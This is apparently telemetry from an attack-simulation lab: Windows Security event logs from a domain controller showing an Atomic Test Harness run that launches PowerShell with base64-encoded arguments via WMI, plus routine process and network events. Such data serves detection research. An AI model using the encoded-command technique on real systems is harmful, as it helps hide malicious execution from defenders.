Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382563
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		51662
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382562
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		51662
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382561
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55165
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382560
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55165
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382585
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\NETWORK SERVICE
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E4

Target Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	New Process ID:		0xc1c
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1ad4
	Creator Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Process Command Line:	powershell.exe -NoProfile -EA PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgA4AGQANgAyADUAZAA3AGUALQA5ADUAOABkAC0ANAA0ADgANwAtADkAMAAwADcALQA5AGUAZQBhADMAOQBhADEANQBjAGEAZgA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -C Write-Host $args[0]

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382584
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x12d8
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382583
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0xc58
	Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382582
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xc58
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x12d8
	Creator Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Process Command Line:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\2\RES6E5.tmp" "c:\Users\Administrator\AppData\Local\Temp\2\201oidti\CSCF2D18528948D46CEAF2E46DDC46B953F.TMP"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382581
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x12d8
	New Process Name:	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1f74
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2\201oidti\201oidti.cmdline"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382580
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\conhost.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382579
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x2114
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382578
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f74
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382577
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1998
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4674
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Sensitive Privilege Use
OpCode=Info
RecordNumber=1382576
Keywords=Audit Success
Message=An operation was attempted on a privileged object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:	Security
	Object Type:	Section
	Object Name:	\Sessions\2\BaseNamedObjects\SessionImmersiveColorPreference
	Object Handle:	0x1a0

Process Information:
	Process ID:	0x1478
	Process Name:	C:\Windows\System32\conhost.exe

Requested Operation:
	Desired Access:	DELETE
				READ_CONTROL
				WRITE_DAC
				WRITE_OWNER
				Query section state
				Map section for write
				Map section for read
				Map section for execute
				Extend size
				
	Privileges:		SeTakeOwnershipPrivilege
